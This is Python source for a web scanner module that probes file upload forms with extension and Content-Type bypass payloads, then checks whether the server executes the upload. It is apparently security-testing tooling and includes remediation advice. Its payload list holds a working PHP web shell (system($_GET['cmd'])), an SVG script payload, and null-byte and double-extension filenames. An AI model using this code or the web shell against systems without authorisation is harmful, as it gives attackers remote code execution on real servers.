"""File Extension Bypass Scanner - OWASP A03:2021 / A04:2021."""
import re
import os
from io import BytesIO
from core.base_scanner import BaseScanner
from core.logger import vuln, debug, info

# Bypass filenames to try uploading
BYPASS_PAYLOADS = [
    # PHP variations
    ("shell.php",          b"<?php echo 'lv99rce'; system($_GET['cmd']); ?>", "lv99rce"),
    ("shell.php5",         b"<?php echo 'lv99rce'; ?>",                       "lv99rce"),
    ("shell.php7",         b"<?php echo 'lv99rce'; ?>",                       "lv99rce"),
    ("shell.phtml",        b"<?php echo 'lv99rce'; ?>",                       "lv99rce"),
    ("shell.pHp",          b"<?php echo 'lv99rce'; ?>",                       "lv99rce"),
    ("shell.PHP",          b"<?php echo 'lv99rce'; ?>",                       "lv99rce"),
    ("shell.php.jpg",      b"<?php echo 'lv99rce'; ?>",                       "lv99rce"),
    ("shell.php%00.jpg",   b"<?php echo 'lv99rce'; ?>",                       "lv99rce"),
    ("shell.php\x00.jpg",  b"<?php echo 'lv99rce'; ?>",                       "lv99rce"),
    ("shell.jpg.php",      b"<?php echo 'lv99rce'; ?>",                       "lv99rce"),
    (".php",               b"<?php echo 'lv99rce'; ?>",                       "lv99rce"),
    ("shell.phar",         b"<?php echo 'lv99rce'; ?>",                       "lv99rce"),
    # ASP/ASPX
    ("shell.asp",          b"<% Response.Write(\"lv99rce\") %>",              "lv99rce"),
    ("shell.aspx",         b'<%@ Page Language="C#"%><%Response.Write("lv99rce");%>', "lv99rce"),
    ("shell.asa",          b"<% Response.Write(\"lv99rce\") %>",              "lv99rce"),
    ("shell.cer",          b"<% Response.Write(\"lv99rce\") %>",              "lv99rce"),
    # JSP
    ("shell.jsp",          b'<% out.println("lv99rce"); %>',                  "lv99rce"),
    ("shell.jspx",         b'<jsp:scriptlet>out.println("lv99rce");</jsp:scriptlet>', "lv99rce"),
    # Content-type bypass with benign ext
    ("shell.jpg",          b"<?php echo 'lv99rce'; ?>",                       "lv99rce"),
    ("shell.png",          b"<?php echo 'lv99rce'; ?>",                       "lv99rce"),
    ("shell.gif",          b"GIF89a<?php echo 'lv99rce'; ?>",                 "lv99rce"),  # GIF magic + PHP
    ("shell.svg",          b'<svg><script>alert("lv99rce")</script></svg>',   "lv99rce"),
    ("shell.xml",          b"<?php echo 'lv99rce'; ?>",                       "lv99rce"),
    # Double extension
    ("shell.php.png",      b"<?php echo 'lv99rce'; ?>",                       "lv99rce"),
    ("shell.png.php",      b"<?php echo 'lv99rce'; ?>",                       "lv99rce"),
]

CONTENT_TYPES = [
    "image/jpeg",
    "image/png",
    "image/gif",
    "application/octet-stream",
    "text/plain",
    "multipart/form-data",
]

SUCCESS_RE = re.compile(r"lv99rce", re.IGNORECASE)
UPLOAD_RESPONSE_RE = re.compile(
    r"success|uploaded|file.*saved|upload.*complete|"
    r"\.php|\.jsp|\.asp|stored at|saved to|path:",
    re.IGNORECASE
)


class FileExtBypassScanner(BaseScanner):
    MODULE_NAME = "file_ext"
    OWASP_CATEGORY = "A03:2021 - Injection"

    def scan(self, urls: list) -> list:
        findings = []
        tested = set()

        for url in urls:
            forms = self.get_forms(url)
            for form in forms:
                key = f"form:{form['url']}"
                if key in tested:
                    continue

                # Look for file upload inputs
                file_fields = self._find_file_fields(form, url)
                if not file_fields:
                    continue

                tested.add(key)
                info(f"  [~] File upload form found at {form['url']} | fields={file_fields}")
                findings.extend(self._test_upload(form, file_fields))

        return findings

    def _find_file_fields(self, form: dict, url: str) -> list:
        """Re-fetch the page to find type=file inputs (get_forms strips them)."""
        resp = self.session.get(url)
        if not resp:
            return []
        file_fields = []
        # Simple regex scan for file inputs
        file_input_re = re.compile(
            r'<input[^>]+type=["\']?file["\']?[^>]*name=["\']?([^"\'>\s]+)',
            re.IGNORECASE
        )
        alt_re = re.compile(
            r'<input[^>]+name=["\']?([^"\'>\s]+)[^>]+type=["\']?file',
            re.IGNORECASE
        )
        for m in file_input_re.finditer(resp.text):
            file_fields.append(m.group(1))
        for m in alt_re.finditer(resp.text):
            name = m.group(1)
            if name not in file_fields:
                file_fields.append(name)
        # Also check input names with typical upload naming
        upload_name_re = re.compile(r"upload|file|attachment|image|photo|avatar", re.IGNORECASE)
        for field in form.get("inputs", {}):
            if upload_name_re.search(field) and field not in file_fields:
                file_fields.append(field)
        return file_fields

    def _test_upload(self, form: dict, file_fields: list) -> list:
        findings = []
        upload_url = form["url"]

        for filename, content, marker in BYPASS_PAYLOADS:
            for file_field in file_fields:
                for content_type in CONTENT_TYPES[:3]:
                    try:
                        # Build multipart form data
                        other_data = {k: v for k, v in form["inputs"].items()
                                      if k not in file_fields}
                        files = {
                            file_field: (
                                filename,
                                BytesIO(content),
                                content_type,
                            )
                        }
                        resp = self.session.session.post(
                            upload_url,
                            files=files,
                            data=other_data,
                            timeout=self.session.timeout,
                            allow_redirects=True,
                        )

                        if not resp:
                            continue

                        # Check for upload success indicators
                        if UPLOAD_RESPONSE_RE.search(resp.text):
                            # Try to access the uploaded file
                            upload_path = self._extract_path(resp.text, filename)
                            if upload_path:
                                exec_resp = self.session.get(upload_path)
                                if exec_resp and SUCCESS_RE.search(exec_resp.text):
                                    f = self.make_finding(
                                        url=upload_url,
                                        param=file_field,
                                        payload=f"{filename} (Content-Type: {content_type})",
                                        evidence=f"File uploaded to {upload_path} and executed: marker found in response",
                                        severity="CRITICAL",
                                        description=(
                                            f"File upload bypass: '{filename}' was accepted with Content-Type: "
                                            f"{content_type} and the server executed its contents. "
                                            "This allows Remote Code Execution."
                                        ),
                                        remediation=(
                                            "Validate file extensions using a strict allowlist. "
                                            "Verify file content using magic bytes, not extension or Content-Type. "
                                            "Store uploaded files outside the web root. "
                                            "Rename uploaded files to a UUID. "
                                            "Disable script execution in upload directories."
                                        ),
                                    )
                                    vuln(f"  [VULN] File Ext Bypass + RCE @ {upload_url} | {filename}")
                                    findings.append(f)
                                    return findings
                            else:
                                # Upload succeeded but we can't locate file - still a finding
                                f = self.make_finding(
                                    url=upload_url,
                                    param=file_field,
                                    payload=f"{filename} (Content-Type: {content_type})",
                                    evidence=resp.text[:300],
                                    severity="HIGH",
                                    description=(
                                        f"File upload bypass: '{filename}' was accepted without rejection. "
                                        "Server may execute uploaded file."
                                    ),
                                    remediation=(
                                        "Validate file extensions using a strict allowlist. "
                                        "Verify file content using magic bytes. "
                                        "Rename uploaded files and store outside the web root."
                                    ),
                                )
                                vuln(f"  [VULN] File Upload Bypass @ {upload_url} | {filename}")
                                findings.append(f)
                                break

                    except Exception as e:
                        debug(f"File upload test error @ {upload_url}: {e}")

        return findings

    def _extract_path(self, response_text: str, filename: str) -> str:
        """Try to extract the uploaded file path from the response."""
        # Look for URL patterns
        url_re = re.compile(r'(?:href|src|url)[=:]\s*["\']?(/[^\s"\'<>]+)', re.IGNORECASE)
        for m in url_re.finditer(response_text):
            path = m.group(1)
            if any(ext in path.lower() for ext in [".php", ".jsp", ".asp", ".png", ".jpg", ".gif", "upload", "file"]):
                base = self.session.base_url
                return f"{base}{path}" if not path.startswith("http") else path

        # Look for the filename itself
        if filename in response_text:
            idx = response_text.index(filename)
            snippet = response_text[max(0, idx - 50):idx + len(filename) + 10]
            path_re = re.compile(r'(/[^\s"\'<>]*' + re.escape(filename) + r')', re.IGNORECASE)
            m = path_re.search(snippet)
            if m:
                return f"{self.session.base_url}{m.group(1)}"

        return ""
